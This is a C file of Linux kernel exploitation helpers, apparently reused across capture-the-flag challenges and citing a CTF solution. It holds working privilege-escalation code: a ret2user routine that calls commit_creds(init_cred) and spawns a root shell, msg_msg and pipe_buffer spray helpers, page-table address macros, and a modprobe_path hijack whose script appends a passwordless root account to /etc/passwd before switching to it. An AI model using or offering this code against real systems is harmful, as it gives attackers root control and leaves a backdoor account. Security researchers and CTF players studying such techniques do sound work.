#define _GNU_SOURCE
#define COLOR_ENABLE 1

#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <poll.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <unistd.h>
#include <stdbool.h>

struct msg_msgseg {
	struct msg_msgseg *next;
	/* the next part of the message follows immediately */
};

struct list_head {
	struct list_head *next, *prev;
};

/* one msg_msg structure for each message */
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;        /* message text size */
	void *next;         /* struct msg_msgseg *next; */
	void *security;     /* NULL without SELinux */
	/* the actual message follows immediately */
};

struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long _private;
};

struct pipe_buf_operations {
	int (*confirm)(void *, void *);

	/*
	 * When the contents of this pipe buffer has been completely
	 * consumed by a reader, ->release() is called.
	 */
	void (*release)(void *, void *);

	/*
	 * Attempt to take ownership of the pipe buffer and its contents.
	 * ->try_steal() returns %true for success, in which case the contents
	 * of the pipe (the buf->page) is locked and now completely owned by the
	 * caller. The page may then be transferred to a different mapping, the
	 * most often used case is insertion into different file address space
	 * cache.
	 */
	bool (*try_steal)(void *, struct pipe_buffer *);

	/*
	 * Get a reference to the pipe buffer.
	 */
	bool (*get)(void *, void *);
};

struct seq_operations {
	void * (*start) (void *m, loff_t *pos);
	void (*stop) (void *m, void *v);
	void * (*next) (void *m, void *v, loff_t *pos);
	int (*show) (void *m, void *v);
};

#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[0;31m"
#define COLOR_GREEN   "\033[0;32m"
#define COLOR_YELLOW  "\033[0;33m"
#define COLOR_BLUE    "\033[0;34m"
#define COLOR_MAGENTA "\033[0;35m"
#define COLOR_CYAN    "\033[0;36m"
#define info(fmt, ...) \
    if (COLOR_ENABLE) { \
        printf(COLOR_BLUE "[*] " fmt COLOR_RESET "\n", ##__VA_ARGS__); \
    } else { \
        printf("[*] " fmt "\n", ##__VA_ARGS__); \
    }
#define success(fmt, ...) \
    if (COLOR_ENABLE) { \
        printf(COLOR_GREEN "[+] " fmt COLOR_RESET "\n", ##__VA_ARGS__); \
    } else { \
        printf("[+] " fmt "\n", ##__VA_ARGS__); \
    }
#define error(fmt, ...) \
    if (COLOR_ENABLE) { \
        printf(COLOR_RED "[-] " fmt COLOR_RESET "\n", ##__VA_ARGS__); \
    } else { \
        printf("[-] " fmt "\n", ##__VA_ARGS__); \
    } 
#define warning(fmt, ...) \
    if (COLOR_ENABLE) { \
        printf(COLOR_YELLOW "[!] " fmt COLOR_RESET "\n", ##__VA_ARGS__); \
    } else { \
        printf("[!] " fmt "\n", ##__VA_ARGS__); \
    }

#define HEXDEBUG(x) \
     if (COLOR_ENABLE) { \
        printf(COLOR_MAGENTA "[#] " #x "=0x%lx\n" COLOR_RESET ,(unsigned long)x); \
    } else { \
        printf("[#] " #x " = 0x%lx\n",(unsigned long)x); \
    }

#define rep(X,Y) for (int X = 0;X < (Y);++X)
#define drep(X,Y) for (unsigned long X = 0;X < (Y);X+=4)
#define qrep(X,Y) for (unsigned long X = 0;X < (Y);X+=8)
#define dqrep(X,Y) for (unsigned long X = 0;X < (Y);X+=16)
#define irep(X) for (int X = 0;;++X)
#define rrep(X,Y) for (int X = int(Y)-1;X >=0;--X)
#define range(X,Y,Z) for (int X = Y;X < Z;X++)

/* https://github.com/gmo-ierae/ierae-ctf/blob/main/2024/pwn/free2free/solution/exploit.c */
#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
    error("%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
    exit(1); \
    } \
    __res; \
    })

#define PTE2V(i) ((unsigned long long)(i) << 12)
#define PMD2V(i) ((unsigned long long)(i) << 21)
#define PUD2V(i) ((unsigned long long)(i) << 30) 
#define PGD2V(i) ((unsigned long long)(i) << 39) 
#define V2PTE(i) (((unsigned long long)(i) >> 12) & 0x1ff) 
#define V2PMD(i) (((unsigned long long)(i) >> 21) & 0x1ff)
#define V2PUD(i) (((unsigned long long)(i) >> 30) & 0x1ff)
#define V2PGD(i) (((unsigned long long)(i) >> 39) & 0x1ff)
#define PHYS_ENTRY(i) ((unsigned long long)(i) | 0x67ULL | (1ULL << 63))
#define PTE2PHYS(i) ((unsigned long)(i) & ~(0x1ULL << 63)&~0xFFFULL)
#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, byte_index) \
  ((void*)(PGD2V((unsigned long long)(pgd_index)) + PUD2V((unsigned long long)(pud_index)) + \
    PMD2V((unsigned long long)(pmd_index)) + PTE2V((unsigned long long)(pte_index)) + (unsigned long long)(byte_index)))
#define KVIRT_TO_PHYS(i) ((unsigned long)(i) & 0xff000)
#define KASLR_DIFF(k_addr, i) ((unsigned long)k_addr + (unsigned long)(i)*0x100000)

/* common data */
#define PROC_NAME "NKTIDKSG"
#define MODPROBE_SCRIPT "#!/bin/sh\necho pwn::0:0:root:/root:/bin/sh>>/etc/passwd\n"
#define MODPROBE_FAKE "/tmps810114514"
#define PAGE_SZ 0x1000

unsigned long cs;
unsigned long ss;
unsigned long rsp;
unsigned long rflags;
unsigned long commit_creds;
unsigned long init_cred;
unsigned long kbase;
unsigned long modprobe_path;

//shellcode
unsigned long ret_true = 0x90c3c0ff48c03148;
unsigned long ret1nop7 = 0x90909090909090c3;

void shell() {
    puts("[*] shell");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    SYSCHK(execve("/bin/sh", argv, envp));
}

static void ret2user(unsigned long rip) {
    asm volatile ("swapgs\n");
    asm volatile(
        "movq %0, 0x20(%%rsp)\t\n"
        "movq %1, 0x18(%%rsp)\t\n"
        "movq %2, 0x10(%%rsp)\t\n"
        "movq %3, 0x08(%%rsp)\t\n"
        "movq %4, 0x00(%%rsp)\t\n"
        "iretq"
        :
        : "r"(ss),
          "r"(rsp),
          "r"(rflags),
          "r"(cs), "r"(rip));
}

void lpe() {
    void (*cc)(void *) = (void (*)(void *))commit_creds;
    (*cc)((void *)init_cred);
    ret2user((unsigned long)shell);
}

static void refuge() {
    asm volatile (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rsp), "=r"(rflags)
        :
        : "memory");
}

void _xxd_qword(char *buf, int size) {
    char *p = buf;
    dqrep (i, size) {
        printf("0x%06x |", (int)i);
        printf(" 0x%016lx ", *(unsigned long *)(p + i));
        printf(" 0x%016lx ", *(unsigned long *)(p + i + 8));
        printf("\n");
    }
}

#define xxd_qword(X,Y) \
    puts("[" #X "]"); \
    _xxd_qword((char *)(X), (int)Y)

void _xxd(char *buf, int size) {
    char *p = buf;
    dqrep (i, size) {
        printf("0x%06x |", (int)i);
        rep (j, 0x10) { printf(" %02x", *(unsigned char *)(p+i+j)); }
        printf(" |");
        rep (j, 0x10) {
            if (*(unsigned char *)(p+i+j) < 0x20 || *(unsigned char *)(p+i+j) > 0x7e) {
                printf(".");
            } else { printf("%c", *(unsigned char *)(p + i + j)); }
        }
        printf("|\n");
    }
}

#define xxd(X,Y) \
    puts("[" #X "]"); \
    _xxd((char *)(X), (int)Y)

void init_modprobe() {
    int exp_fd = SYSCHK(open(MODPROBE_FAKE, O_RDWR | O_CREAT, 0777));
    SYSCHK(write(exp_fd, MODPROBE_SCRIPT, strlen(MODPROBE_SCRIPT)));
    SYSCHK(close(exp_fd));
}

void exec_modprobe() {
    info("exec modprobe");
    socket(38, SOCK_SEQPACKET, 0);
    char *su_argv[] = {"su", "-", "pwn",NULL};
    SYSCHK(execve("/bin/su", su_argv, NULL));
    shell();
}

void exec_modprobe_search_binary() {
    #define TRIG "/tmp/TDN810"
    int trigger = SYSCHK(open(TRIG, O_RDWR | O_CREAT, 0777));
    SYSCHK(write(trigger, "\xdd\xdd", 2));
    SYSCHK(close(trigger));
    execve(TRIG, NULL, NULL);

    char *su_argv[] = {"su", "-", "pwn",NULL};
    SYSCHK(execve("/bin/su", su_argv, NULL));
    shell();
}

#define NUM_CORES 0
void init_proc() {
    SYSCHK(prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0));
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(NUM_CORES, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

int **alloc_pipe(int n_pipes) {
    int **ret = (int **)calloc(n_pipes,sizeof(int *));
    rep(i, n_pipes) {
        ret[i] = (int *)calloc(2,sizeof(int));
    }
    return ret;
}

void pipe_read(int *p, char *buf, int len) {
    SYSCHK(read(p[0],buf,len)); 
}

void pipe_write(int *p, char *buf, int len) {
    SYSCHK(write(p[1],buf,len));
}

void pipe_set_size(int *p, unsigned long sz) {
    SYSCHK(fcntl(p[0], F_SETPIPE_SZ, sz));
}

void write2file(char *fn, char *c) {
    int fd = SYSCHK(open(fn, O_WRONLY | O_CREAT | O_TRUNC, 0644));
    SYSCHK(write(fd, c, strlen(c)));
    SYSCHK(close(fd));
}

char * read2file(char *fn, int size) {
    char *ret = (char *)malloc(sizeof(char)*size);
    int fd = SYSCHK(open(fn, O_RDONLY));
    SYSCHK(read(fd, ret, size));
    SYSCHK(close(fd));
    return ret;
}


char *strrep(char c, int len) {
    char *ret = (char *)malloc(sizeof(c)*len);
    memset(ret,c,len);
    return ret;
}


int *msg_prepare(int n_msg) {
    int *ret = (int *)calloc(n_msg,sizeof(int));
    rep(i, n_msg) {
        ret[i] = SYSCHK(msgget(IPC_PRIVATE, IPC_CREAT | 0666));
    }
    return ret;
}

void msg_send(int m_fd,long mtype,char *mtext,int len,int flag) {
    struct msgbuf *msg = malloc(sizeof(long) + len);
    msg->mtype = mtype;
    memcpy(msg->mtext, mtext, len);
    SYSCHK(msgsnd(m_fd, msg, len, flag));
    free(msg);
}

char *msg_recv(int m_fd, int size,int umtype,int extra_flag) {
    char *ret = (char *)calloc(size + 1, sizeof(char));
    int flag = IPC_NOWAIT | MSG_NOERROR | extra_flag;
    struct msgbuf *msg = malloc(sizeof(long) + size);
    ssize_t received = SYSCHK(msgrcv(m_fd, msg, size, umtype, flag));
    memcpy(ret, msg->mtext, received);
    free(msg);
    return ret;
}
